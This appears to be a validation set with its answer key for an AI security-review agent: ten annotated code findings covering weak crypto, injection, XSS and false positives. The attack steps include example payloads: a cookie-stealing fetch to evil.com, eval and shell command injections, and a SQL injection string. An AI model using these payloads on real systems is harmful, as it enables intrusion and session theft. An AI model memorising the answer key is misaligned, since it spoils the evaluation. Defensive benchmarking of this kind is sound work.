description: Minimal validation set for Ironwall Agent Engine. 10 hand-annotated findings from vulnbench + real projects.

findings.title: DES Cipher Used for Encryption
findings.description: Function encryptDES uses crypto/des which is a broken 56-bit cipher. DES has been considered insecure since the 1990s and can be brute-forced in hours.

attack_steps.description: Attacker intercepts ciphertext encrypted with DES
Brute-force the 56-bit key space (~2^56 operations, feasible with cloud GPUs in hours)
Decrypt all intercepted traffic, recover plaintext secrets

findings.fix:
Replace crypto/des with crypto/aes. Use AES-256-GCM for authenticated encryption:

block, err := aes.NewCipher(key)
aead, err := cipher.NewGCM(block)
ciphertext := aead.Seal(nil, nonce, plaintext, nil)
findings.notes: Clear-cut weak crypto. Any competent security review should flag this. Attack path is straightforward.

findings.title: math/rand Used for Token Generation
findings.description: Function generateTokenBad uses math/rand.Read for generating 32-byte tokens. math/rand is not cryptographically secure — its output is predictable given the seed.

attack_steps.description: Attacker observes tokens generated by this function (e.g., session tokens, reset links)
Determine the math/rand seed (often based on Unix timestamp — low entropy)
Replay the PRNG sequence to predict future tokens and hijack sessions

findings.fix:
Replace math/rand with crypto/rand:

import "crypto/rand"
b := make([]byte, 32)
_, err := rand.Read(b)
findings.notes: MEDIUM because it depends on context — is this token used for auth? If yes, HIGH. AI needs to trace usage.

findings.title: Hardcoded AWS Access Key
findings.description: Variable AWS_ACCESS_KEY contains a hardcoded AWS access key matching the AKIA* pattern. This key if valid grants programmatic AWS API access.

attack_steps.description: Attacker finds source code in GitHub/public repo
Extracts AWS_ACCESS_KEY and AWS_SECRET_KEY pair
Uses aws CLI with stolen credentials: aws ec2 describe-instances
Accesses S3 buckets, launches EC2 instances, exfiltrates RDS data

findings.fix:
Use environment variables or AWS IAM roles. Never hardcode credentials:

import os
AWS_ACCESS_KEY = os.environ.get('AWS_ACCESS_KEY_ID')
AWS_SECRET_KEY = os.environ.get('AWS_SECRET_ACCESS_KEY')
findings.notes: CRITICAL — key pair together means immediate AWS account compromise. This is the #1 thing found in leaked repos.

findings.title: Command Injection via shell=True
findings.description: Function run_cmd passes user-controlled 'cmd' parameter directly to subprocess.check_output with shell=True, allowing arbitrary command execution on the server.

attack_steps.description: Attacker sends GET /exec?cmd=cat+/etc/passwd
shell=True passes cmd string to /bin/sh -c, executing arbitrary commands
Attacker escalates: download reverse shell, establish persistence, exfiltrate database

findings.fix:
Never use shell=True with user input. Use subprocess with argument list:

subprocess.check_output([cmd_base, arg1, arg2], shell=False)

Or better, avoid subprocess entirely and use Python-native APIs.
findings.notes: CRITICAL — shell=True + user input = instant RCE. One of the most dangerous patterns.

findings.title: SQL Injection in Flask Route
findings.description: Function get_user_bad uses f-string interpolation to build SQL query from URL parameter, allowing SQL injection.

attack_steps.description: Attacker sends GET /user/admin'+OR+'1'='1
f-string interpolation produces: SELECT * FROM users WHERE name = 'admin' OR '1'='1'
Returns all user rows. Attacker escalates to UNION SELECT to extract other tables

findings.notes: Classic SQLi. AI should detect the f-string interpolation pattern. Evidence is clear.

findings.title: Dangerous eval() with User Input
findings.description: Function eval_code passes user-controlled 'code' parameter directly to Python eval(), allowing arbitrary code execution.

attack_steps.description: Attacker sends GET /eval?code=__import__('os').system('id')
eval() executes arbitrary Python code with the application's privileges
Full server compromise: read files, modify data, establish persistence

findings.fix: Never use eval() on user input. If dynamic evaluation is absolutely required, use ast.literal_eval() which only evaluates literals, or implement a safe DSL parser.
findings.notes: CRITICAL — eval() on user input is essentially a backdoor. Should be the easiest finding to confirm.

findings.title: Insecure Session Cookie Configuration
findings.description: Res.cookie sets session token without httpOnly, secure, or SameSite flags, making it vulnerable to XSS-based theft and CSRF attacks.

attack_steps.description: Attacker finds XSS vulnerability elsewhere in the app
Injects: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
Without httpOnly, document.cookie returns the session token. Attacker hijacks session.
Without SameSite, CSRF attacks can force authenticated users to perform unwanted actions

findings.notes: HIGH — missing all three security flags. Also note the anti-pattern: token from req.query.token (GET parameter) is also bad.

findings.title: Weak TLS Configuration
findings.description: TLS min_version set to TLSv1.0 which has known vulnerabilities (BEAST, POODLE). Should be TLS 1.2 minimum.
findings.code_snippet:
tls:
  enabled: false  # should be true
  min_version: "TLSv1.0"  # weak — should be 1.2+

attack_steps.description: TLS is disabled (enabled: false), so TLS version is moot
If TLS were enabled, TLSv1.0 is vulnerable to BEAST attack (CVE-2011-3389)
Attacker on same network can decrypt HTTPS traffic via CBC padding oracle

findings.fix:
Set TLS enabled: true and min_version to TLSv1.2 or higher:

tls:
  enabled: true
  min_version: "TLSv1.2"
findings.notes: AI should NOT confirm this as directly exploitable because TLS is disabled (line 22: enabled: false). The min_version config is dead code until TLS is enabled. Tests AI's ability to distinguish config intent vs actual exposure.

findings.title: XML External Entity (XXE) Vulnerability
findings.description: Function parse_xml uses xml.etree.ElementTree.parse() on user-supplied XML data. While ElementTree is safe by default in Python 3, using parse() on untrusted input without explicit defenses is risky if the parser is ever swapped.

attack_steps.description: xml.etree.ElementTree is NOT vulnerable to XXE by default in Python 3.x
However, xml_parse() expects a file path, not XML string — this code will throw FileNotFoundError, not parse XML
Code is broken as written — parse() takes a filename, not XML content

findings.fix:
Two issues: (1) Use ET.fromstring() for parsing XML strings, not parse(). (2) Use defusedxml for safe XML parsing:

from defusedxml.ElementTree import fromstring
tree = fromstring(xml_data)
findings.notes: AI should REJECT this finding. ElementTree is XXE-safe by default in Python 3, AND the code is broken (parse() takes filepath, not string). Tests whether AI blindly confirms scanner output or actually analyzes the code.

findings.title: Hardcoded Placeholder Token (False Positive)
findings.description: Variable EXAMPLE_TOKEN and PLACEHOLDER contain placeholder values that match secret patterns but are not real secrets.
findings.code_snippet:
# False positive — should ideally not flag
EXAMPLE_TOKEN = "your_token_here"
PLACEHOLDER = "sk_test_replace_me"
findings.fix: N/A — this is a false positive. The values are documentation placeholders, not real secrets. Tools should be configured to ignore patterns like 'your_*_here' and '*_replace_me'.
findings.notes: AI should REJECT — clear false positive. Values are semantic placeholders, not secrets. Tests AI's ability to recognize non-secret patterns that match secret regex.

metrics.expected_ai_precision: If AI confirms exactly GOLDEN-001 through GOLDEN-007 and rejects GOLDEN-008 through GOLDEN-010: precision=1.0, recall=1.0, F1=1.0
metrics.baseline_scanner_note: Traditional scanners flag all 10 as positive. Scanner precision=0.7 (7 real / 10 flagged). Agent should achieve >0.7 precision.
